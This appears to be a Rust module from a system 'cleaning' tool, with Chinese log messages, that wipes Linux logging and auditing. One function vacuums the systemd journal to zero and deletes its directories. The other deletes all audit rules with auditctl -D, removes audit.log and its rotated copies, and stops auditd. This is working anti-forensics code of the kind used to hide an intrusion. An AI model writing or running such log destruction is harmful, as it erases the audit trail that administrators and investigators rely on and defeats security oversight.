use crate::common::Context;
use std::path::Path;

pub fn clean_systemd_journal(ctx: &Context) {
    ctx.info("清理 systemd journal...");

    ctx.run_cmd("journal rotate", "journalctl", &["--rotate"]);
    ctx.run_cmd("journal vacuum", "journalctl", &["--vacuum-size=0"]);

    let journal_dirs = ["/var/log/journal", "/run/log/journal"];
    for dir in &journal_dirs {
        let p = Path::new(dir);
        if p.exists() {
            ctx.remove(p);
        }
    }

    ctx.run_cmd_fallback(
        "重启 journald",
        &[
            ("systemctl", &["restart", "systemd-journald"]),
            ("service", &["systemd-journald", "restart"]),
        ],
    );
}

pub fn clean_auditd(ctx: &Context) {
    ctx.info("清理 auditd...");

    ctx.run_cmd("清空 audit 规则", "auditctl", &["-D"]);

    let audit_logs = [
        "/var/log/audit/audit.log",
        "/var/log/audit/audit.log.1",
        "/var/log/audit/audit.log.2",
        "/var/log/audit/audit.log.3",
        "/var/log/audit/audit.log.4",
    ];
    for log in &audit_logs {
        let p = Path::new(log);
        if p.exists() {
            ctx.remove(p);
        }
    }

    ctx.run_cmd_fallback(
        "停止 auditd",
        &[
            ("systemctl", &["stop", "auditd"]),
            ("service", &["auditd", "stop"]),
        ],
    );
}
